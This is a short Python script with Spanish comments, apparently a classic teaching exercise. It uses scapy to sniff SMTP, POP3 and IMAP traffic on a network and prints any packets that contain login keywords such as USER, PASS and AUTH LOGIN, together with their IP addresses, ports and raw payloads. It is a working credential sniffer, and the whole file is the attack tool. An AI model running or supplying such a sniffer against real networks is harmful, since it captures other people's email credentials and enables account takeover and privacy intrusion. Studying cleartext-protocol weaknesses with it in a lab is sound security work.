from scapy.all import *
import sys
import os

def packet_callback(packet):
    """
    Callback para analizar cada paquete capturado y buscar credenciales de email.
    """
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Buscar comandos SMTP, POP3 e IMAP
            keywords = ['user', 'pass', 'USER', 'PASS', 'MAIL FROM', 'RCPT TO', 'AUTH LOGIN', 'LOGIN']
            
            for keyword in keywords:
                if keyword in payload:
                    print(f"\n[!] Posible credencial detectada!")
                    
                    if packet.haslayer(IP):
                        print(f"[*] IP Origen: {packet[IP].src}")
                        print(f"[*] IP Destino: {packet[IP].dst}")
                    
                    if packet.haslayer(TCP):
                        print(f"[*] Puerto Origen: {packet[TCP].sport}")
                        print(f"[*] Puerto Destino: {packet[TCP].dport}")
                    
                    print(f"[*] Payload:")
                    print(f"    {payload.strip()}")
                    print("-" * 60)
                    break
        except Exception as e:
            pass

def main():
    """
    Función principal para iniciar el sniffer de correo.
    """
    # Verificar privilegios de root
    if os.geteuid() != 0:
        print("[!!] Este script requiere privilegios de root")
        print("[!!] Ejecuta con: sudo python3 mail_sniffer.py")
        sys.exit(1)
    
    print("[*] Mail Sniffer iniciado")
    print("[*] Capturando tráfico en puertos: 25 (SMTP), 110 (POP3), 143 (IMAP)")
    print("[*] Presiona Ctrl+C para detener\n")
    
    try:
        # Capturar tráfico en los puertos comunes de mail
        # 25=SMTP, 110=POP3, 143=IMAP
        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", 
              prn=packet_callback, 
              store=0)
    except KeyboardInterrupt:
        print("\n\n[*] Sniffer detenido")
        sys.exit(0)
    except PermissionError:
        print("\n[!!] Error: Se necesitan privilegios de root")
        print("[!!] Ejecuta con: sudo python3 mail_sniffer.py")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
